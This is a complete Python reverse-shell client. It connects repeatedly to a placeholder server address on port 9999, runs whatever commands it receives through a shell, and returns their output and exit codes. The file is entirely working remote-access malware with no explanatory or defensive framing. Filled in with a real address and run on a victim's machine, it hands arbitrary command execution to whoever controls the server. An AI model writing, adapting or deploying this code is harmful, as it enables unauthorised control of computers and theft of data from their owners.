import socket
import subprocess
import time

class colors:
    RESET = "\033[0m"
    GREEN = "\033[92m"
    RED = "\033[91m"

def execute_command(command):
    try:
        completed_process = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = completed_process.stdout
        exit_code = completed_process.returncode
        return output, exit_code
    except subprocess.CalledProcessError as e:
        return e.output

if __name__ == "__main__":
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(('SERVER_IP', 9999))
                print(f"{colors.GREEN}Successfully connected to server !{colors.RESET}\n")
                while True:
                    command = s.recv(1024).decode('utf-8')
                    if not command:
                        break
                    output, exit_code = execute_command(command)
                    s.sendall(str(exit_code).encode('utf-8'))
                    time.sleep(1)
                    if not output:
                        output = "\0"
                    s.sendall(output.encode('utf-8'))
                    time.sleep(1)
        except Exception as e:
            print(f"[{colors.RED}Error{colors.RESET}] Can't connect to server, retry in 10 seconds...")
            time.sleep(10)
            print("")
